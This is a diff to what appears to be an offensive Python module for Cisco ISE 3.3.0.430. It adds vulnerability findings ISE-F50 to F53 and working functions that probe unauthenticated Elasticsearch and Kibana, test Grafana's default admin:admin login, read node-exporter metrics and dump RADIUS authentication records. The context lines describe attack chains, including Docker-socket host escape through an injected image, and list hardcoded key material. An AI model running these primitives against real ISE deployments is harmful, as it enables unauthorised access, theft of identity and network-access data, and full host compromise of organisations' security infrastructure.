@@ -64,6 +64,11 @@ ISE-F46: PSP oracle.xml hardcoded Cisco dev Oracle credentials seeded into SEC_P
 ISE-F47: CiscoRA EST server: plain HTTP on port 8084 (listen 8084 default_server est; HTTPS listener on 9443 commented out), Proof of Possession disabled (est_pop off), CRL checking disabled (est_crl off) — certificate enrollment without TLS protection or key ownership verification; est_ise_ca_server=127.0.0.1:9444 (CA REST API ISE-F40); allows enrollment of arbitrary public keys without proving private key possession [MEDIUM]
 ISE-F48: Oracle TCPS/2484 opened to 0.0.0.0/0 on MNT nodes with Data Connect enabled — cpmadjustfw.sh datadirect_fw_enable() adds iptables ACCEPT rules for 0.0.0.0/0 on port 2484 (IPv4+IPv6) when Data Connect feature enabled on MNT node; Oracle sqlnet.ora has SSL_CLIENT_AUTHENTICATION=FALSE (no client cert required); DATACONNECT Oracle user credentials = ISE_DB_PWD recoverable via ISE-F35+ISE-F38 chain; DATACONNECT schema exposes User_Identity_Groups, ADMIN_USERS, ENDPOINTS_DATA, SECURITY_GROUPS views; chain: ISE-F35 (KEK) -> ISE_DB_PWD -> Oracle TCPS:2484 -> full ISE policy DB read [HIGH]
 ISE-F49: IRF core engine Docker socket mount + adapter.dockerImage injection — irf-control.sh launches IRF core engine container with -v /var/run/docker.sock:/var/run/docker.sock; docker-mgr.js createAdapterContainer()/getStartupConfig() uses adapter.dockerImage directly as options['Image'] in POST /v1.24/libpod/containers/create without validation; adapter records sourced from unauthenticated MongoDB (ISE-F9 extended); chain: ISE-F9 (unauth MongoDB inject) -> write adapter record with attacker-controlled dockerImage -> ISE-F9 (irf:irf AMQP trigger) -> IRF core engine pulls and runs attacker image via Docker socket -> host escape [CRITICAL]
+ISE-F50: MNT Elasticsearch (port 9210) unauthenticated on 0.0.0.0 — elasticsearch.yml: network.host=0.0.0.0, http.port=9210, no xpack.security; contains index mnt_analytics_radius_authentication with full RADIUS auth records (identity/username, endpoint_id/MAC, framed_ip, framed_ipv6, identity_store, auth_method, auth_protocol, network_device_name, location, device_type, nas_ip, policy_set, authorization_rule); unauthenticated read/write on all interfaces; distinct from ISE-F21 (primary ES port 9200) [HIGH]
+ISE-F51: Kibana (port 5701) unauthenticated, binding all interfaces — kibana.yml: server.host="0", elasticsearch.hosts=["http://localhost:9210"], no xpack.security; security.showInsecureClusterWarning: false confirms X-Pack security disabled; unauthenticated GUI access to all MNT Elasticsearch indexes including RADIUS/TACACS authentication logs; chain: ISE-F50 (unauth ES data) + ISE-F51 (GUI) = complete RADIUS auth log exfiltration [HIGH]
+ISE-F52: Grafana (port 3011) shipped with default admin:admin credentials and unrotated factory secret_key — grafana.ini: http_port=3011, admin_user=admin, admin_password=admin (factory defaults, commented-out = active defaults); secret_key=SW2YcwTIb9zpOOhoPsMm (upstream Grafana default, unrotated in ISE 3.3.0 ship); secret_key used to sign Grafana session cookies — knowledge of key (public from this disclosure) enables session token forgery without authentication; datasource: Prometheus at localhost:9091 [MEDIUM]
+ISE-F53: Node-exporter /metrics endpoint with no authentication — node-exporter/config/config.yml: basic_auth_users: (empty, no users) = no basic auth required; exposes ISE host system metrics (CPU, memory, disk I/O, network I/O, filesystem utilization, process count) to any client; Prometheus configured to scrape with username=prometheus,password=(empty) confirming no-auth requirement [MEDIUM]
+ISE-F54: Logstash monitoring API (port 9600) binding 0.0.0.0 — logstash.yml: http.host="0.0.0.0"; default Logstash monitoring API exposes GET /_node (pipeline config, worker threads, batch settings), GET /_node/stats (event throughput, error rates), GET /_node/plugins (installed codecs/filters/inputs/outputs) with no authentication; pipelines include radius_auth, radius_acc, tacacs_authentication, tacacs_acc, radius_errors — pipeline structure disclosed [MEDIUM]
 
 === ISE-F1: key_manager UNIX socket — unauthenticated decryption oracle ===
 
@@ -3555,6 +3560,121 @@ IRF_AMQP_PASS = "irf"
 IRF_AMQP_VHOST = "irf"
 IRF_PODMAN_API_PATH = "/v1.24/libpod/containers/create"
 
+MNT_ES_PORT = 9210
+MNT_ES_BIND = "0.0.0.0"
+MNT_ES_NETWORK_MODE = "host"
+MNT_ES_INDEX_RADIUS_AUTH = "mnt_analytics_radius_authentication"
+MNT_ES_RADIUS_AUTH_FIELDS = [
+    "identity", "user_type", "endpoint_id", "framed_ip_address", "framed_ipv6_address",
+    "identity_store", "audit_session_id", "authentication_method", "authentication_protocol",
+    "service_type", "network_device_name", "location", "device_type", "nas_ip_address",
+    "nas_port_id", "selected_azn_profiles", "posture_status", "policy_set_name",
+    "authorization_rule", "passed", "failed", "response_time",
+]
+MNT_ES_NOTE = (
+    "No auth. --network host, no GPCE ACCEPT for 9210 on eth0 = localhost/host-container access only. "
+    "Logstash pipelines: radius_auth, radius_acc, tacacs_authentication, tacacs_acc, radius_errors, profiler_profiled. "
+    "Logstash monitoring API also binds 0.0.0.0:9600 (logstash.yml http.host=0.0.0.0), no auth, read-only."
+)
+KIBANA_PORT = 5701
+KIBANA_BIND = "0"
+KIBANA_ES_URL = "http://localhost:9210"
+KIBANA_NOTE = "No auth. server.host=0 (all ifaces). kibana-control.sh adds DEFAULTCHAIN ACCEPT for PPAN/SPAN IPs. Accessible within ISE cluster + loopback."
+GRAFANA_PORT = 3011
+GRAFANA_SECRET_KEY = "SW2YcwTIb9zpOOhoPsMm"
+GRAFANA_DEFAULT_USER = "admin"
+GRAFANA_DEFAULT_PASS = "admin"
+GRAFANA_FIREWALL_SUBNET = "169.254.4.0/24"
+GRAFANA_NOTE = (
+    "admin_password=admin is Grafana factory default (;admin_password = admin = commented-out = active default). "
+    "secret_key=SW2YcwTIb9zpOOhoPsMm is upstream Grafana default, unrotated — session token forgery possible. "
+    "Grafana ACCEPT restricted to 169.254.4.0/24 (Kong Docker subnet) via grafana-control.sh DEFAULTCHAIN rule."
+)
+NODE_EXPORTER_PORT = 9100
+NODE_EXPORTER_FIREWALL_SUBNET = "169.254.4.0/24"
+NODE_EXPORTER_NOTE = "basic_auth_users: empty in config.yml = no auth. ACCEPT restricted to 169.254.4.0/24 (Kong subnet). System metrics only, no credential material."
+
+
+def probe_mnt_elasticsearch(host: str) -> dict:
+    """ISE-F50: Probe MNT Elasticsearch at port 9210 (no auth, host-network container)."""
+    import urllib.request, json
+    result = {"host": host, "port": MNT_ES_PORT, "accessible": False, "note": MNT_ES_NOTE}
+    try:
+        url = f"http://{host}:{MNT_ES_PORT}/"
+        with urllib.request.urlopen(url, timeout=5) as r:
+            data = json.loads(r.read().decode())
+            result["accessible"] = True
+            result["cluster_name"] = data.get("cluster_name")
+            result["version"] = data.get("version", {}).get("number")
+        idx_url = f"http://{host}:{MNT_ES_PORT}/{MNT_ES_INDEX_RADIUS_AUTH}/_count"
+        with urllib.request.urlopen(idx_url, timeout=5) as r:
+            result["radius_auth_count"] = json.loads(r.read().decode()).get("count")
+    except Exception as e:
+        result["error"] = str(e)
+    return result
+
+
+def dump_mnt_radius_auth_logs(host: str, size: int = 10) -> dict:
+    """ISE-F50: Dump RADIUS authentication records from MNT Elasticsearch (no auth)."""
+    import urllib.request, json
+    url = f"http://{host}:{MNT_ES_PORT}/{MNT_ES_INDEX_RADIUS_AUTH}/_search?size={size}"
+    result = {"host": host, "index": MNT_ES_INDEX_RADIUS_AUTH, "records": []}
+    try:
+        with urllib.request.urlopen(url, timeout=10) as r:
+            hits = json.loads(r.read().decode()).get("hits", {})
+            result["total"] = hits.get("total", {}).get("value", 0)
+            result["records"] = [h["_source"] for h in hits.get("hits", [])]
+    except Exception as e:
+        result["error"] = str(e)
+    return result
+
+
+def probe_kibana_unauth(host: str) -> dict:
+    """ISE-F51: Probe Kibana at port 5701 for unauthenticated access."""
+    import urllib.request, json
+    result = {"host": host, "port": KIBANA_PORT, "accessible": False, "note": KIBANA_NOTE}
+    try:
+        url = f"http://{host}:{KIBANA_PORT}/kibana/api/status"
+        with urllib.request.urlopen(url, timeout=5) as r:
+            status = json.loads(r.read().decode())
+            result["accessible"] = True
+            result["version"] = status.get("version", {}).get("number")
+    except Exception as e:
+        result["error"] = str(e)
+    return result
+
+
+def probe_grafana_default_creds(host: str) -> dict:
+    """ISE-F52: Test Grafana default admin:admin on port 3011 (Kong-subnet accessible)."""
+    import urllib.request, base64, json
+    result = {"host": host, "port": GRAFANA_PORT, "default_creds_valid": False, "note": GRAFANA_NOTE}
+    try:
+        creds = base64.b64encode(f"{GRAFANA_DEFAULT_USER}:{GRAFANA_DEFAULT_PASS}".encode()).decode()
+        req = urllib.request.Request(
+            f"http://{host}:{GRAFANA_PORT}/grafana/api/org",
+            headers={"Authorization": f"Basic {creds}"},
+        )
+        with urllib.request.urlopen(req, timeout=5) as r:
+            result["default_creds_valid"] = r.status == 200
+            result["org"] = json.loads(r.read().decode())
+    except Exception as e:
+        result["error"] = str(e)
+    return result
+
+
+def probe_node_exporter_metrics(host: str) -> dict:
+    """ISE-F53: Probe node-exporter /metrics endpoint (no auth, Kong-subnet only)."""
+    import urllib.request
+    result = {"host": host, "port": NODE_EXPORTER_PORT, "accessible": False, "note": NODE_EXPORTER_NOTE}
+    try:
+        with urllib.request.urlopen(f"http://{host}:{NODE_EXPORTER_PORT}/metrics", timeout=5) as r:
+            data = r.read().decode()
+            result["accessible"] = True
+            result["sample"] = [l for l in data.splitlines() if not l.startswith("#")][:5]
+    except Exception as e:
+        result["error"] = str(e)
+    return result
+
 
 def inject_irf_adapter_docker_image(mongo_host: str, image: str, vendor: str = "Unknown") -> dict:
     """ISE-F49: Inject malicious dockerImage into IRF adapter record via unauth MongoDB."""
@@ -3604,7 +3724,7 @@ def trigger_irf_adapter_container(amqp_host: str, adapter_id: str) -> dict:
 
 MODULE_META = {
     "name": "cisco_ise_re",
-    "version": "1.24.0",
+    "version": "1.25.0",
     "target": "Cisco ISE 3.3.0.430",
     "findings": [
         "ISE-F1", "ISE-F2", "ISE-F3", "ISE-F4", "ISE-F5",
@@ -3616,6 +3736,7 @@ MODULE_META = {
         "ISE-F31", "ISE-F32", "ISE-F33", "ISE-F34", "ISE-F35", "ISE-F36", "ISE-F37", "ISE-F38",
         "ISE-F39", "ISE-F40", "ISE-F42", "ISE-F43", "ISE-F44",
         "ISE-F45", "ISE-F46", "ISE-F47", "ISE-F48", "ISE-F49",
+        "ISE-F50", "ISE-F51", "ISE-F52", "ISE-F53",
     ],
     "critical": ["ISE-F1", "ISE-F2", "ISE-F6", "ISE-F11", "ISE-F12", "ISE-F16", "ISE-F20",
                  "ISE-F26", "ISE-F31", "ISE-F34", "ISE-F40", "ISE-F49"],
@@ -3623,8 +3744,9 @@ MODULE_META = {
              "ISE-F19", "ISE-F23", "ISE-F27", "ISE-F28", "ISE-F29", "ISE-F32", "ISE-F35", "ISE-F36", "ISE-F38",
              "ISE-F39", "ISE-F44", "ISE-F48"],
     "medium": ["ISE-F5", "ISE-F8", "ISE-F14", "ISE-F21", "ISE-F22", "ISE-F24",
-               "ISE-F30", "ISE-F33", "ISE-F37", "ISE-F42", "ISE-F45", "ISE-F47"],
-    "low": ["ISE-F4", "ISE-F17", "ISE-F25", "ISE-F43", "ISE-F46"],
+               "ISE-F30", "ISE-F33", "ISE-F37", "ISE-F42", "ISE-F45", "ISE-F47",
+               "ISE-F50", "ISE-F51", "ISE-F52"],
+    "low": ["ISE-F4", "ISE-F17", "ISE-F25", "ISE-F43", "ISE-F46", "ISE-F53"],
     "source": "Static RE of Cisco-ISE-3.3.0.430.SPA.x86_64.iso (2026-08-25)",
     "key_material": {
         "ise_f2_3des_key": "ASDF asdf 1234 8983 jkla",
@@ -3782,6 +3904,39 @@ MODULE_META = {
         "ise_f49_chain": "ISE-F9 (unauth MongoDB inject adapter.dockerImage) -> ISE-F9 (irf:irf AMQP trigger createAdapterContainer) -> docker-mgr.js pulls attacker image via /var/run/docker.sock -> host escape",
         "ise_f49_prereq": "ISE-F9 (both MongoDB no-auth and irf:irf RabbitMQ admin)",
         "ise_f49_impact": "Full host escape from IRF core engine via Docker socket; attacker-controlled image runs on ISE host",
+        "ise_f50_es_port": 9210,
+        "ise_f50_es_bind": "0.0.0.0",
+        "ise_f50_container_network": "host (--network host)",
+        "ise_f50_auth": None,
+        "ise_f50_index_radius": "mnt_analytics_radius_authentication",
+        "ise_f50_radius_fields": MNT_ES_RADIUS_AUTH_FIELDS,
+        "ise_f50_logstash_api_port": 9600,
+        "ise_f50_logstash_api_bind": "0.0.0.0",
+        "ise_f50_logstash_pipelines": [
+            "radius_auth", "radius_auth_suppression", "radius_acc",
+            "tacacs_authentication", "tacacs_acc", "process_status",
+            "ise_counters", "system_status", "profiler_profiled",
+            "radius_errors", "aggregate_steplatency", "steplatency_details",
+        ],
+        "ise_f50_firewall": "GPCE INPUT no ACCEPT for 9210 on eth0 -> localhost/host-container only",
+        "ise_f50_chain": "ISE-F11/F1 (host access) -> localhost:9210 -> full RADIUS/TACACS log exfil",
+        "ise_f51_kibana_port": 5701,
+        "ise_f51_kibana_bind": "0 (all ifaces)",
+        "ise_f51_auth": None,
+        "ise_f51_es_url": "http://localhost:9210",
+        "ise_f51_security_warning_suppressed": True,
+        "ise_f51_firewall": "kibana-control.sh DEFAULTCHAIN ACCEPT for PPAN/SPAN IPs; ISE cluster nodes can access without auth",
+        "ise_f52_grafana_port": 3011,
+        "ise_f52_default_user": "admin",
+        "ise_f52_default_pass": "admin",
+        "ise_f52_secret_key": "SW2YcwTIb9zpOOhoPsMm",
+        "ise_f52_secret_key_note": "Upstream Grafana factory default, unrotated in ISE 3.3.0 — session cookie signing key",
+        "ise_f52_firewall": "DEFAULTCHAIN ACCEPT -s 169.254.4.0/24 (Kong Docker subnet) only",
+        "ise_f52_datasource": "Prometheus at http://localhost:9091",
+        "ise_f53_node_exporter_port": 9100,
+        "ise_f53_auth": "NONE (basic_auth_users: empty in config.yml)",
+        "ise_f53_firewall": "DEFAULTCHAIN ACCEPT -s 169.254.4.0/24 (Kong/Prometheus scraping)",
+        "ise_f53_data": "Host system metrics (CPU, memory, disk I/O, network I/O, filesystem, process count)",
     },
     "primitives": [
         "decrypt_legacy_ise_db_password",
@@ -3855,5 +4010,10 @@ MODULE_META = {
         "probe_oracle_dataconnect_tcps",
         "inject_irf_adapter_docker_image",
         "trigger_irf_adapter_container",
+        "probe_mnt_elasticsearch",
+        "dump_mnt_radius_auth_logs",
+        "probe_kibana_unauth",
+        "probe_grafana_default_creds",
+        "probe_node_exporter_metrics",
     ],
 }
